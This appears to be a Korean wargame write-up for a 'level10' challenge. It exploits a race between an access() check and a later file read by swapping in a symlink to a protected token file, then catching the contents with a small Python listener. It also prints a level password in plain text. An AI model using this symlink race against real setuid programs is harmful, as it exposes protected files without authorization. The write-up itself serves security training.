> Password: s5cAJpM8ev6XHw998pRWG728z

# 접근 방법



access()를 통해서 파일의 실제 권한을 확인한 뒤에 나중에 그 파일의 내용을 서버로 보내는 프로그램인데

access()체크 뒤에 파일을 바꾸는 공격에 취약하다는 점을 이용함.

서버 소스
```python
from socket import socket, AF_INET, SOCK_STREAM

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 6969))
s.listen(1)

input("PRESS ANY KEY TO CONTINUE")

conn, _ = s.accept()
recv_data = conn.recv(1024)
print(recv_data)
s.close()
```

1) /tmp 폴더에 적당한 파일을 생성
2) 서버 실행
3) level10프로그램 실행
4) 방금 생성한 파일과 같은 이름으로 token에 대한 소프트 링크 생성
5) 서버 실행 재개

```shell
> touch /tmp/test
> python /tmp/server.py
> ~/level10 /tmp/test localhost
> ln -s ~/token /tmp/test
> PRESS ANY KEY
```